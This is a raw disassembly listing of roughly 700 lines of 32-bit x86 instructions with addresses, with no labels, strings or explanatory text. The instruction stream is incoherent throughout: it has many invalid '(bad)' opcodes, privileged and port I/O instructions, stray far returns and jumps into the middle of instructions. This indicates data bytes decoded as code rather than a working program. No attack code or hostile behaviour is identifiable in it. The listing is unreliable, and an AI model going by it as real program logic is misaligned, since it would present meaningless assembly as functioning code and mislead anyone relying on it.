  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
